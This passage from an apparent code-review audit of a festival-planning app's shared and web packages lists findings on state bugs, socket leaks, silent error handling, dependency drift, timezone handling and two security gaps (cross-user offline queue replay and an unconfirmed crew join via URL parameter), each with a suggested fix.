**Suggested fix:** Mirror reformCrew's replace-or-append: `crews: state.crews.some((c) => c.id === crew.id) ? state.crews.map((c) => (c.id === crew.id ? crew : c)) : [...state.crews, crew]`.

### [LOW] useSocket auth-refresh callback can reconnect a torn-down socket after unmount (socketRef never cleared)

- **File:** `packages/shared/src/hooks/useSocket.ts:44`
- **Dimension:** socket lifecycle / subscription leak · **Effort:** trivial

The onAuthError handler captured by each created socket does `useAuthStore.getState().refreshToken().then(() => { const t = useAuthStore.getState().userToken; if (t && socketRef.current) { socketRef.current.auth = { token: t }; socketRef.current.connect(); } })` (lines 42-48). The effect cleanup calls `socket.disconnect()` but never sets `socketRef.current = null`, so if the auth error fires around unmount (or an old socket's pending refresh resolves after teardown), the callback calls `.connect()` on the disconnected socket — reviving a connection that no effect manages and whose app-level listeners were removed in cleanup (it still holds the internal connect/connect_error handlers from createSocket), leaking a live socket until page close. After logout the refresh would fail, but a token-refresh-succeeds-after-unmount path reconnects unconditionally.

**Suggested fix:** In the effect cleanup, null the ref when it still points at this socket (`if (socketRef.current === socket) socketRef.current = null;`) and/or capture a `disposed` flag in the effect that the onAuthError continuation checks before reconnecting.

### [LOW] useFestivalStore.setState routing table omits saveReminder/applyProfilePatch and the _cached* fields — those keys are silently dropped

- **File:** `packages/shared/src/stores/festivalStore.ts:96`
- **Dimension:** zustand store facade correctness · **Effort:** trivial

The facade's setState routes keys via hardcoded sets: `const dataKeys = new Set<string>(['festivals', 'currentFestivalId', ..., 'savePick', 'bulkSavePicks', 'removePick', 'saveNote', 'setError'])` (lines 96-116). It is missing `saveReminder`, `applyProfilePatch`, `isLoading` is present but `_festivalCachedAt`, `_profilesCachedAt`, `_cachedFestivalId` are not — any of those keys passed to `useFestivalStore.setState(...)` (e.g. test mocks stubbing `saveReminder`, or code syncing the cache stamps) is silently discarded with no error, while the same call via `useFestivalDataStore.setState` would work. Silent partial application of a setState call is a correctness trap that diverges from the real store's behavior.

**Suggested fix:** Route by membership in the actual stores instead of a hand-maintained list: `const key in useFestivalDataStore.getState() ? dataPart : key in useFestivalUIStore.getState() ? uiPart : dataPart` (or at minimum add the missing keys and a dev-mode console.warn for unroutable keys).

### [LOW] authStore surfaces raw error.message instead of mapErrorToUserMessage — inconsistent error contract vs every other store

- **File:** `packages/shared/src/stores/authStore.ts:198`
- **Dimension:** error-consistency · **Effort:** trivial

Every action in crewStore, festivalDataStore, and notificationPrefsStore maps errors through `mapErrorToUserMessage` (friendly offline/429/5xx messages). authStore's twelve actions instead use `const message = err instanceof Error ? err.message : 'Login failed';` (login:198, register:218, forgotPassword:302, resendVerification:314, changePassword:326, updateDisplayName:341, deleteAccount:354, removeAvatar:420). An offline login therefore shows the raw 'Request timed out' / fetch failure text rather than the package's standard 'You appear to be offline…' copy, and a 429 shows the bare server string without the Retry-After hint — two different error vocabularies in the same shared `error: string | null` contract consumed by both apps.

**Suggested fix:** Replace the `err instanceof Error ? err.message : fallback` pattern in authStore with `mapErrorToUserMessage(err, fallback)` (already exported from services/errors).

### [LOW] createCrew inserts a fabricated member with empty-string ids, violating its own type and breaking userId lookups

- **File:** `packages/shared/src/stores/crewStore.ts:306`
- **Dimension:** types-that-lie · **Effort:** trivial

After POST /crews succeeds, createCrew sets `crewMembers: [{ id: '', userId: '', name: 'You', role: 'owner' }]` even though the POST response (serializeCrewWithMembers) already contains the real members array on `crew.members`. The placeholder's empty `userId` means any consumer doing `members.find((m) => m.userId === user.id)` (web crew.tsx:192 meMember) or useCrew's `new Set(crewMembers.map((m) => m.userId))` silently fails for the creator's own row until the next selectCrew refetch — the freshly created crew misreports 'who am I in this crew'.

**Suggested fix:** Use the server response: `crewMembers: crew.members ?? []` (matching selectCrew/reformCrew, which already do `crew.members ?? []`), and drop the fabricated row.

### [LOW] Dead lying types: AuthResponse models the envelope the api client strips; NotificationPrefs is an unused legacy shape

- **File:** `packages/shared/src/types/domain.ts:84`
- **Dimension:** dead-code · **Effort:** trivial

`export interface AuthResponse { data: { user: User; token?: string }; error?: null; }` has zero consumers in shared/web/mobile (grep: only the definition) and is actively misleading — services/api.ts unwraps the `{ data, error }` envelope (api.ts:362-365), so no caller ever sees this shape; authStore types the unwrapped body inline instead. Similarly `NotificationPrefs` (domain.ts:540) is consumed nowhere, and notificationPrefsStore.ts:7-9 explicitly says it 'does not match this endpoint'. Both are exported via the package barrel, inviting an app dev to build against a wire shape that does not exist.

**Suggested fix:** Delete AuthResponse and NotificationPrefs from types/domain.ts (or replace AuthResponse with the real post-unwrap `{ user: User; token?: string; roles?: string[] }` shape and have authStore.login/register use it).

### [LOW] createAdminApi() is dead code that returns the plain api unchanged

- **File:** `packages/shared/src/services/api.ts:444`
- **Dimension:** dead-code · **Effort:** trivial

`export function createAdminApi(): typeof api { return api; }` has no callers anywhere in the repo (grep across all packages: definition only). Its name implies an admin-scoped client (separate token/base?), but it just aliases `api`, so any future consumer would get silently wrong behavior rather than a missing function.

**Suggested fix:** Delete createAdminApi (and its barrel export); reintroduce a real implementation only when an admin-scoped client exists.

### [LOW] useFestivalStore.setState routes fields through hardcoded key allowlists and silently drops anything missing — the lists are already stale

- **File:** `packages/shared/src/stores/festivalStore.ts:96`
- **Dimension:** api-contract · **Effort:** small

The legacy facade's setState splits a partial across the two stores using hardcoded `dataKeys`/`uiKeys` Sets. The dataKeys list (lines 96-116) omits fields that exist on festivalDataStore today: `saveReminder`, `applyProfilePatch`, `_festivalCachedAt`, `_profilesCachedAt`, `_cachedFestivalId`. Anything not in either set is silently discarded (`else` branch drops it), so `useFestivalStore.setState({ _cachedFestivalId: 'x' })` is a no-op with no error — a trap that will widen every time festivalDataStore grows. Current real callers are tests only, but the facade is the exported public surface of the package.

**Suggested fix:** Derive the routing dynamically: `const dataKeys = new Set(Object.keys(useFestivalDataStore.getState()))` (computed lazily) and likewise for UI, or route unknown keys to the data store with a dev-mode console.warn, so new state fields can never silently vanish.

### [LOW] createSocket returns an untyped Socket, so the ServerToClientEvents/ClientToServerEvents maps are decorative

- **File:** `packages/shared/src/services/socket.ts:17`
- **Dimension:** api-contract · **Effort:** small

types/socket-events.ts painstakingly defines `ServerToClientEvents` (241-305) and `ClientToServerEvents` (311-338) 'for type-safe listeners', but `export function createSocket(...): Socket` returns the unparameterized `Socket`, and `io(url || undefined, opts)` is likewise untyped. Every `socket.on('crew:poll-voted', handler)` in useSocket/useCrewRealtime and both apps' useRealtimeSync therefore type-checks against `(...args: any[])` — payload drift (e.g. a renamed field in CrewPollVotedPayload) compiles silently. Each handler must re-assert payload types manually (e.g. useCrewRealtime's per-handler payload annotations), which is exactly what the event maps were written to avoid.

**Suggested fix:** Type the factory: `import { io, Socket } from 'socket.io-client'; export type FestieSocket = Socket<ServerToClientEvents, ClientToServerEvents>; export function createSocket(...): FestieSocket { const socket: FestieSocket = io(...); ... }` and update the `Socket` re-export consumers (useCrewRealtime already imports the type from this module, so the fix propagates).

---

# Web (packages/web) — 54 findings

### [HIGH] web and shared run ESLint without declaring it; lockfile resolves their plugins against eslint@10.4.1 despite the workspace override pinning ^9.39.0

- **File:** `packages/web/package.json:11`
- **Dimension:** dependencies · **Effort:** small

web's `"lint": "eslint src/"` (line 11) and shared's `"lint": "eslint src/ --ext .ts,.tsx"` run ESLint, but neither package lists `eslint` in devDependencies (web has only `typescript-eslint` and plugins; shared has only `eslint-plugin-react-hooks`). It is installed solely as an auto-installed peer, and the lockfile shows web/shared plugins resolved against a different ESLint **major** than mobile: `eslint-plugin-react-hooks: version: 7.1.1(eslint@10.4.1(jiti@2.7.0))` for both web and shared, vs mobile's declared `eslint: ^9.39.0` → 9.39.4. This also means the root pnpm override `"eslint": "^9.39.0"` (packages/package.json line 18) is not actually constraining the auto-installed peer — the lockfile has drifted past it to v10. Lint behavior for web/shared is unpinned and will silently change on reinstall.

**Suggested fix:** Add `"eslint": "^9.39.0"` (or whichever major is intended) to devDependencies of packages/web and packages/shared, run `pnpm install`, and verify the lockfile no longer contains eslint@10.x resolutions. If v10 was intended, update the override and mobile to match so the whole workspace lints with one major.

### [HIGH] Timeline now-indicator ignores the festival date and post-midnight rollover

- **File:** `packages/web/src/hooks/useNowIndicator.ts:27`
- **Dimension:** timezone/date handling · **Effort:** small

The now-line position is computed purely from wall-clock minutes: `const nowMins = now.getHours() * 60 + now.getMinutes(); if (nowMins >= timeBounds.minMin && nowMins <= timeBounds.maxMin)`. Two bugs: (1) `timeBounds.maxMin` can exceed 1440 for post-midnight sets (useTimelineFilters.ts:77 does `if (end <= start) end += 24 * 60`), but `nowMins` is never rolled over — so at 1:00 AM during a set that runs until 2:00 AM, nowMins=60 < minMin and the now-line plus the floating "Now" button vanish exactly during late-night prime time. (2) `selectedDay` is never compared to today's date, so viewing any other festival day (or any festival whose hours happen to bracket the current wall-clock time, even months before/after the event) renders a bogus NOW line and triggers timeline.tsx's tick-driven auto-scroll-to-now on a day that isn't today.

**Suggested fix:** In the nowIndicator memo: (a) only return a position when the selected day's date is today (compare days[selectedDay].date to the local date via the shared TZ-safe helpers); (b) when `nowMins < timeBounds.minMin`, retry with `nowMins + 1440` to handle the post-midnight window before declaring it out of range.

### [HIGH] festivalDataStore.error is never rendered anywhere on web — every pick/reminder/note failure is invisible

- **File:** `packages/web/src/components/features/DetailPanel.tsx:169`
- **Dimension:** silent-failures · **Effort:** small

DetailPanel's pick and reminder handlers swallow errors with comments claiming the store will surface them: `catch { /* store surfaces error */ }` (lines 168-169 for savePick, 184-185 for saveReminder). But a repo-wide search shows NO web component ever subscribes to `useFestivalDataStore((s) => s.error)` — the only error consumers on web are toasts in crew/account flows. festivalDataStore.savePick rolls back the optimistic update and sets `error`, so on a server error (or a mid-flight timeout while navigator.onLine is still true — the classic flaky-festival-signal case, which the offline queue does NOT intercept) the star silently un-fills with zero message. The note handlers (lines 126-128, 144-146) fall back to `warningHaptic()` only, which is a no-op on desktop, so a failed note save gives literally no feedback while the typed text stays in the textbox looking saved.

**Suggested fix:** Wire the web toast system into these handlers (`catch (e) { toast(mapErrorToUserMessage(e, "Couldn't save pick"), 'error') }`), or add a single global subscriber that toasts whenever festivalDataStore.error transitions to non-null. Then delete the now-true-but-currently-false '/* store surfaces error */' comments.

### [HIGH] Web 'Join festival' in DetailPanel also fails silently despite toast infra being available

- **File:** `packages/web/src/components/features/DetailPanel.tsx:222`
- **Dimension:** silent-failures · **Effort:** trivial

handleJoinFestival: `try { await api.post(`/profiles`, ...); await useFestivalStore.getState().loadProfiles(...); onClose(); } catch { /* Join failed */ } finally { setJoinBusy(false); }`. The empty catch means a failed join (auth blip, 5xx, flaky signal) ends the busy state and leaves the panel open with no message — the user cannot tell whether they joined. The web app has a working `useToast()` used in the same component tree (e.g. routes/crew.tsx, RidesTab), so the error path is simply unwired, not unavailable.

**Suggested fix:** Add `const { toast } = useToast()` and in the catch: `toast(e instanceof Error ? e.message : "Couldn't join festival. Try again.", 'error')`.

### [MEDIUM] Offline mutation queue survives logout and is replayed under the next signed-in user

- **File:** `packages/web/src/hooks/useOfflineQueueBridge.ts:30`
- **Dimension:** security · **Effort:** small

Queued offline writes are stored in IndexedDB ('festie-offline-queue', localStorage fallback) with no user binding, and the bridge drains them unconditionally on mount and on every 'online' event: `if (navigator.onLine) processQueue(adapter).catch(() => {});` (useOfflineQueueBridge.ts:30). Nothing clears the queue on logout: `clearQueue` exists (packages/web/src/hooks/useOfflineQueue.ts:492) but has no caller outside the hook's return value, the shared `authStore.logout` only purges the SW cache (`caches.delete('api-cache')`, packages/shared/src/stores/authStore.ts:243-245), and main.tsx's auth-change subscription only calls `queryClient.clear()` (main.tsx:100-104). On a shared device, user A's queued picks/ratings/crew mutations persist after logout; when user B signs in, `processQueue` replays them with B's session cookie — if B shares a crew the writes succeed attributed to B, otherwise the 4xx path surfaces A's pending mutation bodies (url, body via `addFailedSync`, useOfflineQueue.ts:457-465) in B's PendingSyncSheet, a cross-account write-integrity and info-disclosure gap.

**Suggested fix:** Bind queue entries to the user: stamp each QueuedMutation with the userId at enqueue time and have processQueue skip-and-drop entries whose userId doesn't match the current `useAuthStore` user. Additionally wire clearing into the existing auth-change subscription in main.tsx (alongside queryClient.clear()) so logout / user-switch empties both the IndexedDB store and the 'festie-offline-queue' localStorage fallback.

### [MEDIUM] Drive-by crew join: ?joinCrew= URL param auto-creates a profile and joins a crew with zero confirmation

- **File:** `packages/web/src/hooks/useFestivalLoader.ts:83`
- **Dimension:** security · **Effort:** small

The deep-link handler executes a state-changing crew join purely from a GET query parameter with no user interaction: for an authenticated user it silently runs `await api.post('/profiles', { festivalId: currentFestival.id })` (line 80) and `await joinByCode({ inviteCode: code });` (line 83), then shows only a 'Joined crew' toast. For an unauthenticated user the code is stashed (`sessionStorage.setItem('fk.pendingJoinCrew', code)`, line 65 — unbounded/unvalidated) and replayed automatically right after registration/login (lines 104-122). An attacker who gets a logged-in victim to click `https://festie.us/?joinCrew=<attacker-code>` (chat link, QR code at a festival, embedded redirect) forcibly enrolls the victim into the attacker's crew, exposing the victim's picks, schedule, activity, expense handles and crew-visible data to the attacker, and making the victim a recipient of attacker-controlled crew content (SOS banners, polls, meeting points). Session-cookie auth makes this a one-click cross-site state change the backend cannot distinguish from a legitimate join.

**Suggested fix:** Insert an explicit consent step: instead of calling joinByCode directly, resolve the invite (e.g. GET crew name for the code) and show a confirmation dialog ('Join crew \"X\"?') before joining; only create the festival profile after the user confirms. Also validate/length-cap the joinCrew param (e.g. /^[A-Za-z0-9-]{4,32}$/) before stashing it in sessionStorage or sending it to the API, and apply the same confirmation to the post-login replay path.

### [MEDIUM] @tanstack/react-query 5.100.14 does not satisfy react-query-persist-client's peer range ^5.101.0

- **File:** `packages/web/package.json:22`
- **Dimension:** dependencies · **Effort:** trivial

web declares `"@tanstack/react-query": "^5.100.14"` (resolved 5.100.14) alongside `"@tanstack/react-query-persist-client": "^5.101.0"` and `"@tanstack/query-sync-storage-persister": "^5.101.0"`. The lockfile shows `@tanstack/react-query-persist-client@5.101.0: peerDependencies: '@tanstack/react-query': ^5.101.0` — an unmet peer that pnpm currently papers over. The persist client and the query core it persists are from different patch trains, and a future strict-peer install or pnpm upgrade will hard-fail.

**Suggested fix:** Bump web's `@tanstack/react-query` to `^5.101.0` so all three @tanstack/* packages resolve to the same release line, then `pnpm install` to dedupe.

### [MEDIUM] All web/shared lint rules at 'warn' never gate CI — eslint runs without --max-warnings 0

- **File:** `packages/web/eslint.config.js:30`
- **Dimension:** config · **Effort:** small

Most safety rules in web/shared eslint configs are warnings, e.g. `'react-hooks/exhaustive-deps': 'warn'`, `'@typescript-eslint/no-unused-vars': ['warn', ...]`, `'no-console': ['warn', ...]`, `'require-atomic-updates': 'warn'`, `'no-empty': 'warn'` (packages/web/eslint.config.js lines 30-52, mirrored in packages/shared/eslint.config.mjs lines 33-54). The lint scripts are plain `eslint src/` (web package.json line 11) and CI runs `pnpm --filter @festie/web lint` (.github/workflows/ci.yml line 51) with no `--max-warnings` flag. ESLint exits 0 when only warnings are emitted, so none of these rules ever fail CI — new violations accumulate invisibly.

**Suggested fix:** Add `--max-warnings 0` to the web/shared/mobile lint scripts (e.g. `"lint": "eslint src/ --max-warnings 0"`) after burning down the existing warning count, or promote the rules you actually want enforced to 'error'.

### [MEDIUM] Test files are excluded from typechecking in web and shared — type errors in tests are never caught

- **File:** `packages/web/tsconfig.json:20`
- **Dimension:** tsconfig · **Effort:** small

web/tsconfig.json has `"exclude": ["src/**/*.test.ts", "src/**/*.test.tsx", "src/**/*.spec.ts", "src/**/*.spec.tsx"]` and the `typecheck` script is `tsc --noEmit` against that config; shared/tsconfig.json line 21 likewise excludes `"src/**/*.test.ts"`. Vitest transpiles without typechecking, so test files in both packages are never typechecked by any tool — broken types in tests (stale mocks after a shared-type change, wrong fixture shapes) only surface as runtime test failures or not at all. Note shared's exclude also misses a hypothetical `.test.tsx`, showing the pattern is ad hoc.

**Suggested fix:** Add a `tsconfig.test.json` per package that extends the base, includes tests, and adds vitest types; run it in the typecheck script (`tsc --noEmit && tsc -p tsconfig.test.json --noEmit`) — keeping the build config (web/tsconfig.app.json) as the only place tests are excluded.

### [MEDIUM] Grid NOW line has the same wall-clock-only bug (no date check, no post-midnight rollover)

- **File:** `packages/web/src/routes/grid.tsx:107`
- **Dimension:** timezone/date handling · **Effort:** small

`const nm = now.getHours() * 60 + now.getMinutes(); if (nm < bounds.lo || nm > bounds.hi) return null;` — `bounds.hi` is rollover-extended (`hi = Math.max(hi, b <= a ? b + 1440 : b)` at line 93) but `nm` is not, so the grid NOW line and the auto-scroll-to-now effect (line 117) disappear after midnight during late-night sets. It also renders on any `selectedDay` regardless of whether that day is today, and `nowPx` is computed once per render with no tick, so it never advances while the view stays mounted.

**Suggested fix:** Mirror the timeline fix: gate on days[selectedDay] being today, try `nm + 1440` when below bounds.lo, and drive `now` from the shared `useNow()` 60s clock so the line advances.

### [MEDIUM] Expense mutations never invalidate ['expense-balances'] — crew tab badge stays stale

- **File:** `packages/web/src/components/crew/ExpensesTab.tsx:122`
- **Dimension:** TanStack Query misuse · **Effort:** trivial

All three expense mutations only invalidate two keys: `qc.invalidateQueries({ queryKey: ['expenses', crewId] }); qc.invalidateQueries({ queryKey: ['settlement-plan', crewId] });` (addExpense onSuccess line 122-125, removeExpense line 133-136, settle line 143-146). But routes/crew.tsx line 96-106 drives the "unsettled balance" badge from a separate `['expense-balances', activeCrewId]` query hitting `/crews/:id/expenses/balances`, with a 5-minute default staleTime. After adding an expense or settling up, the red unsettled badge on the Expenses tab does not update (or wrongly persists after settling) until the cache happens to be invalidated by something else.

**Suggested fix:** Add `qc.invalidateQueries({ queryKey: ['expense-balances', crewId] })` to the onSuccess of addExpense, removeExpense, and settle (or consolidate the badge onto the settlement-plan query).

### [MEDIUM] Crew realtime sink invalidates the wrong/missing keys for expenses and activity

- **File:** `packages/web/src/hooks/useCrewQuerySink.ts:49`
- **Dimension:** TanStack Query misuse · **Effort:** trivial

`onExpensesChanged` invalidates `['expenses', crewId]` and `['expense-balances', crewId]`, but ExpensesTab's settle-up UI now reads `['settlement-plan', crewId]` (ExpensesTab.tsx:104), which is never invalidated — a crewmate adding/settling an expense leaves my settle-up plan stale. Additionally `onActivityLogged` is a no-op with the comment "Web has no activity feed query/view — nothing to invalidate", but ActivityTab.tsx:57 queries `['crew-activity', crewId]`, so realtime activity events never refresh the visible activity feed. The header comment's event→key map ("keys confirmed against the *Tab components") is out of date on both counts. Flag-gated behind VITE_CREW_REALTIME, so latent until the flag ships.

**Suggested fix:** In onExpensesChanged also invalidate `['settlement-plan', crewId]`; implement onActivityLogged as `queryClient.invalidateQueries({ queryKey: ['crew-activity', crewId] })`; update the mapping comment.

### [MEDIUM] Query-persist buster is always '' — per-user cache scoping documented but inert

- **File:** `packages/web/src/lib/queryPersist.ts:65`
- **Dimension:** race conditions in async handlers · **Effort:** medium

`buster: useAuthStore.getState().user?.id ?? ''` is evaluated synchronously when main.tsx calls `buildPersistOptions()` during the initial render (main.tsx:112). The auth store's persist storage has an async `getItem` (packages/shared/src/stores/authStore.ts:117 `getItem: async (name) => …`), so zustand hydration has not completed at that point and `user` is always null on page load — the buster is always ''. The module's documented session-safety property ("`buster` is keyed to the current user id, so a different user's restore is rejected") therefore never holds: every restore is accepted regardless of which user persisted the cache. On a shared browser, user A's persisted crew data (polls, expenses, meeting points) is restored and briefly readable before/unless the clear()-on-auth-change subscription fires.

**Suggested fix:** Either delay persistence wiring until auth hydration finishes (zustand `persist.onFinishHydration`) and pass the real user id, or validate ownership on restore (e.g. store the user id inside the persisted payload and drop it in `restoreClient`/`shouldDehydrateQuery` when it mismatches the hydrated user).

### [MEDIUM] ExpensesTab splitWith keeps the previous crew's member ids after switching crews

- **File:** `packages/web/src/components/crew/ExpensesTab.tsx:78`
- **Dimension:** stale closures / state initialization · **Effort:** trivial

`const [splitWith, setSplitWith] = useState<string[]>(() => members.map((m) => m.userId));` runs only on first mount, and CrewTabContent renders `<ExpensesTab crewId={crewId} members={members} …/>` keyed only by `tab` (CrewTabContent.tsx:41 `key={tab}`), not by crewId. Switching the active crew while on the Expenses tab keeps the component mounted with new props but stale state: `splitWith` still holds the OLD crew's userIds, so the next "Add Expense" posts a split_with list of users who aren't in the new crew (and members who ARE in the new crew are excluded). The same un-keyed remount also leaks form/view state across crews.

**Suggested fix:** Key the tab content by crew: `key={`${tab}-${crewId}`}` in CrewTabContent (or add an effect in ExpensesTab that resets splitWith when crewId/members change).

### [MEDIUM] Pending ?joinCrew replay after registration never re-triggers the join effect

- **File:** `packages/web/src/hooks/useFestivalLoader.ts:118`
- **Dimension:** wrong/missing useEffect deps · **Effort:** small

The replay effect restores the stashed invite code into the URL with `url.searchParams.set('joinCrew', pending); window.history.replaceState(…); joinAttemptedRef.current = null;` — but a replaceState does not re-run any effect, and the deep-link handler effect (line 56) reads `window.location.search` only when its deps `[user?.id, currentFestival?.id, currentProfile?.id, …]` change. Both effects fire in the same commit on login (user?.id change), and the deep-link effect runs FIRST (declared earlier), before the replay effect has written the param back. If the newly registered user has no profile in the current festival (the normal case), neither `currentFestival?.id` nor `currentProfile?.id` changes afterwards, so the join is never executed — the user lands logged in with ?joinCrew=CODE sitting in the URL until a full page reload.

**Suggested fix:** Have the replay effect invoke the join logic directly (extract the join routine into a callback both effects share), or track the pending code in React state so setting it re-renders and re-runs the deep-link effect.

### [MEDIUM] ToastProvider context value is rebuilt every render — every toast re-renders all 38 consumer components, including every SetCard in the card grid

- **File:** `packages/web/src/lib/toastContext.tsx:90`
- **Dimension:** performance · **Effort:** small

`<ToastContext.Provider value={{ toasts, toast, toastUndo, removeToast, pauseToast, resumeToast }}>` creates a fresh object on each ToastProvider render, and the provider wraps the entire app (main.tsx:113). Any toast add/auto-dismiss flips `toasts` state, so EVERY component calling `useToast()` re-renders — 38 non-test files consume it, including `SetCard` (components/features/SetCard.tsx:100, one instance per card on /cards — a long lineup day is 100+ cards), `ExpensesTab`, and `AppShell` itself via `useFestivalLoader` (hooks/useFestivalLoader.ts:28). Each toast lifecycle (show + timed removal, default 3s) therefore re-renders the whole card grid and the shell twice, defeating SetCard's carefully written custom memo comparator. Toasts fire on common paths: pick-save failures, preview errors, expense add/settle, share-link copy, crew joins.

**Suggested fix:** Split the context: keep `toasts` in a state-only context consumed solely by the `<Toast/>` renderer, and expose the action functions (`toast`, `toastUndo`, `removeToast`, `pauseToast`, `resumeToast`) through a second context whose value is wrapped in `useMemo` (all the callbacks are already stable `useCallback`s, so the memoized actions object never changes). Point `useToast()` at the actions context so SetCard/AppShell consumers stop re-rendering on toast state changes.

### [MEDIUM] AppShell subscribes to onlineUsers/connected it never renders — every presence:update re-renders the entire app shell

- **File:** `packages/web/src/hooks/useRealtimeSync.ts:68`
- **Dimension:** performance · **Effort:** small

`useRealtimeSync` subscribes to uiStore presence state: `const connected = useUIStore((state) => state.connected);` (line 66) and `const onlineUsers = useUIStore((state) => state.onlineUsers);` (line 68), returning both. Its only caller is `AppShell` (components/layout/AppShell.tsx:75), which uses ONLY `realtime?.socket` — never `connected` or `onlineUsers`. The `presence:update` handler (line 198-202) calls `setOnlineUsers(data.online.map(...))`, producing a new array on every event, so each user join/leave in the festival room re-renders AppShell and its non-memoized children (Header, SubHeader, BottomNav, OfflineBanner, UpdatePrompt, IOSInstallSheet, Onboarding, ScheduleViewSwitcher). At a live festival with crews connecting/dropping on flaky signal, this is a steady stream of whole-shell re-renders for data nothing in the shell displays (CrewStatus reads onlineUsers from the store directly).

**Suggested fix:** Remove the `useUIStore` selector subscriptions for `connected`/`onlineUsers` from `useRealtimeSync` (the handlers already write via `setConnected`/`setOnlineUsers` action references, which are stable). Return only `{ socket }`; any component that needs `connected`/`onlineUsers` should select them from `useUIStore` itself. Optionally also bail out in the presence handler when the mapped list is shallow-equal to the current store value.

### [MEDIUM] Duplicate full-festival fetch on every authenticated boot (selectFestival fired twice)

- **File:** `packages/web/src/hooks/useFestivalLoader.ts:125`
- **Dimension:** performance · **Effort:** small

Two effects both end up calling `selectFestival` during a fresh authenticated boot. The boot effect (lines 37-46) runs `loadFestivals()` then `selectFestival(fests[0].id)` when no festival is selected. Separately, the "Re-fetch festival profiles on login" effect — `useEffect(() => { if (user && currentFestival) { selectFestival(currentFestival.id).catch(() => {}); } }, [user?.id, currentFestival?.id])` (lines 125-129) — fires as soon as `currentFestival?.id` transitions null→id, i.e. immediately after the first selectFestival resolves, issuing a second full `selectFestival`. `selectFestival` is the heaviest loader in the app (festivalDataStore.ts:156: full `/festivals/:id` detail with every day/set/stage, plus `/profiles/:festivalId`), so logged-in users download the entire festival payload twice on startup — exactly the slow-network startup path the offline-first work targets. It also does a full festival reload on login when only profiles need refreshing.

**Suggested fix:** Guard the login-refetch effect with a ref of the last `(userId, festivalId)` pair it has handled, and skip when the festival was just selected by the boot effect (e.g. set the ref inside the boot effect's `.then`). Additionally, for the mid-session-login case call the cheaper `loadProfiles(currentFestival.id)` instead of a full `selectFestival` — the festival schedule itself hasn't changed on login.

### [MEDIUM] Realtime event-dispatch logic duplicated wholesale between web and mobile useRealtimeSync

- **File:** `packages/web/src/hooks/useRealtimeSync.ts:94`
- **Dimension:** logic duplicated between web and shared/mobile · **Effort:** medium

The entire socket event -> store-reload dispatch layer is duplicated between packages/web/src/hooks/useRealtimeSync.ts and packages/mobile/hooks/useRealtimeSync.ts: the same `schedule` debouncer, `reloadProfiles`/`reloadFestival`/`reloadCrews` helpers, `patchOrReload` ("const patchOrReload = (data: ProfileUpdatedPayload) => { const patched = useFestivalStore.getState().applyProfilePatch(...); if (!patched) reloadProfiles(); }"), and the identical handler set for 'pick:updated', 'picks:updated', 'note:saved', 'profile:updated/joined/left', 'crew:updated', 'crew:member-joined/left', 'festival:set-added/updated'. Mobile's copy (lines 127-200, 371-401) is line-for-line the same business logic with extra crew-tab handlers bolted on. This is exactly the parity-critical routing the repo rule says belongs in @festie/shared — a new socket event or a debounce fix now has to land twice, and the two copies have already started drifting (mobile added crew-polls/expenses/activity scheduling web lacks).

**Suggested fix:** Extract a platform-agnostic event router into @festie/shared (mirroring the existing shared/src/realtime/crewEventRouter pattern): a function that takes the socket plus a sink of reload callbacks and registers/unregisters the festival/profile/pick/crew handlers with the shared 300ms debounce. Web and mobile then only supply their platform-specific sinks (TanStack Query invalidation vs store reloads).

### [MEDIUM] Crew-plan digest assembly (pickActiveMeetingPoint + buildSlots) copy-pasted between web and mobile

- **File:** `packages/web/src/routes/crew-plan.tsx:31`
- **Dimension:** logic duplicated between web and shared · **Effort:** small

packages/web/src/routes/crew-plan.tsx defines `function pickActiveMeetingPoint(points: CrewMeetingPoint[], nowMs: number)` (lines 31-42), `const PRIORITY_RANK: Record<Priority, number> = { must: 3, 'want-to-see': 2, maybe: 1 }` (line 18), and the slot-grouping `buildSlots(sets, days, profiles, nowMs)` (lines 61-100). packages/mobile/app/crew-plan.tsx has byte-identical copies (PRIORITY_RANK line 19, pickActiveMeetingPoint line 24, the same best-pick-per-member loop at line 73). This is pure, testable business logic (offline plan digest) that the repo rule says must live in @festie/shared; note shared/src/utils/ongoingNotification.ts already exports a THIRD, slightly different `pickActiveMeetingPoint` (no nowMs param), so there are now three competing definitions of "the active meeting point".

**Suggested fix:** Move pickActiveMeetingPoint (time-aware variant) and buildSlots into @festie/shared/utils (e.g. planDigest.ts) with unit tests, reconcile with the ongoingNotification.ts variant, and have both crew-plan screens import them.

### [MEDIUM] PlanQRShare snapshot-building hook duplicated verbatim between web and mobile

- **File:** `packages/web/src/components/features/PlanQRShare.tsx:32`
- **Dimension:** logic duplicated between web and shared · **Effort:** small

The QR plan-snapshot assembly is duplicated: web's `function pickShareMeetingPoint(points, nowMs)` (lines 32-41), `const PRIORITY_RANK: Record<string, number> = { must: 3, 'want-to-see': 2, maybe: 1 }` (line 29), and the `usePlanSnapshot()` ranking/capping logic ("sort((a, b) => (PRIORITY_RANK[b.priority] ?? 0) - (PRIORITY_RANK[a.priority] ?? 0)).slice(0, MAX_PICKS)", lines 67-71) exist identically in packages/mobile/components/PlanQRShare.tsx (lines 29-75). The file's own comment admits it: "Mirrors mobile PlanQRShare EXACTLY". Only the codec (encodePlanSnapshot) was moved to shared; the snapshot input construction — which decides WHAT gets shared — was not, so a capping or ranking change must be made twice or web/mobile QR codes diverge.

**Suggested fix:** Move pickShareMeetingPoint and a store-free buildPlanSnapshotInput(festival, profile, meetingPoints, nowMs) into @festie/shared/utils/planSnapshot.ts next to the codec; keep only the useMemo/store wiring per platform.

### [MEDIUM] SetCard crew-overlap cluster logic duplicated line-for-line with SetCardMobile

- **File:** `packages/web/src/components/features/SetCard.tsx:69`
- **Dimension:** logic duplicated between web and shared · **Effort:** small

`buildOverlapBreakdown(friends)` (SetCard.tsx lines 69-80), `PRIORITY_RANK` (52-56), `PRIORITY_NOUN` (58-62), and the `groupedFriends` profileId->userId->crewMember.avatar join + priority sort (lines 141-161, ending ".sort((a, b) => PRIORITY_RANK[a.priority] - PRIORITY_RANK[b.priority])") are duplicated byte-for-byte in packages/mobile/components/SetCardMobile.tsx (buildOverlapBreakdown at line 85, the same join/sort at lines ~290-305). This is the crew-overlap business logic (who's going, avatar resolution, a11y breakdown phrasing) — any change to priority ordering or the avatar-fallback chain must be applied in two places.

**Suggested fix:** Export buildOverlapBreakdown and a pure groupFriendOverlap(friendProfiles, allProfiles, crewMembers) helper from @festie/shared/utils; both SetCard variants keep only their render layers.

### [MEDIUM] Timeline timeBounds / timed-vs-TBA split duplicated between web hook and mobile screen

- **File:** `packages/web/src/hooks/useTimelineFilters.ts:69`
- **Dimension:** logic duplicated between web and shared · **Effort:** small

